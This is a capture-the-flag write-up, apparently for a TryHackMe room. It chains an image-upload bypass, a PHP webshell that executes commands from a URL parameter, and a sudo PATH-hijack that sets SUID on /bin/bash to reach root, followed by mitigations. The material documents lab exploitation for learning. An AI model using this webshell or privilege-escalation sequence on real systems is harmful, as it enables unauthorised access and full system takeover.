# 🏁 CTF Writeup: EH101v13

**Platform:** TryHackMe  
**Difficulty:** 🔴 Hard  
**Category:** Web Upload → RCE → Linux Privilege Escalation  
**Completion Date:** 2025  
**Status:** ✅ Solved (Root)

---

## 📝 Summary

This room simulates a real-world web application with a file upload vulnerability that leads to Remote Code Execution (RCE), followed by a PATH hijacking privilege escalation to achieve root access.

**Attack Chain:**
```
File Upload Bypass → WebShell Execution → Low-Priv Shell → PATH Hijack → Root
```

---

## 🔍 Phase 1: Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sV -oN initial.txt TARGET_IP
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### Web Enumeration

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Discovered Paths:**
```
/upload.php       (Status: 200)
/uploads/         (Status: 301)
/admin/           (Status: 403)
/config.php       (Status: 403)
```

---

## 💥 Phase 2: File Upload Exploitation

### Bypass Strategy

The upload form only accepted images by extension check. Bypass used:
1. Changed Content-Type to `image/jpeg`
2. Added magic bytes `FF D8 FF E0` to the PHP webshell
3. Used double extension: `shell.php.jpg`

### WebShell Used (Sanitized)

```php
<?php
// Educational PoC - sanitized
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
```

### Triggering RCE

```
http://TARGET_IP/uploads/shell.php.jpg?cmd=id
```

**Output:** `uid=33(www-data) gid=33(www-data)`

---

## 🔼 Phase 3: Privilege Escalation via PATH Hijacking

### Enumeration

```bash
sudo -l
# (www-data) NOPASSWD: /usr/bin/python3 /opt/monitor.py

cat /opt/monitor.py
# import os
# os.system("health-check")   ← calls relative binary!
```

### PATH Hijack Exploit

```bash
# Create malicious binary in writable directory
echo '#!/bin/bash' > /tmp/health-check
echo 'chmod +s /bin/bash' >> /tmp/health-check
chmod +x /tmp/health-check

# Prepend /tmp to PATH and run the vulnerable script
export PATH=/tmp:$PATH
sudo /usr/bin/python3 /opt/monitor.py

# Exploit SUID bash
/bin/bash -p
# whoami → root ✅
```

---

## 🚩 Flags

- **User Flag:** `THM{[REDACTED - sanitized for publication]}`
- **Root Flag:** `THM{[REDACTED - sanitized for publication]}`

---

## 🧠 Key Takeaways

| Lesson | Details |
|--------|---------|
| **File Upload Bypass** | MIME type + magic bytes bypass is more reliable than extension filtering alone |
| **Relative PATH in Scripts** | Never call binaries by relative name in privileged scripts |
| **Sudo -l is gold** | Always check sudo permissions during privilege escalation |
| **Defense** | Use `env_reset` in sudoers; call absolute paths in scripts |

---

## 🛡️ Mitigations

1. **File Upload:** Validate magic bytes server-side, store uploads outside webroot, use random filenames
2. **PATH Hijacking:** Always use absolute paths (`/usr/bin/health-check` not `health-check`) in scripts run as root
3. **Sudo Config:** Use `env_reset` and `secure_path` in `/etc/sudoers`

---

*This writeup is sanitized. No flags, live IPs, or credentials from active systems are published.*
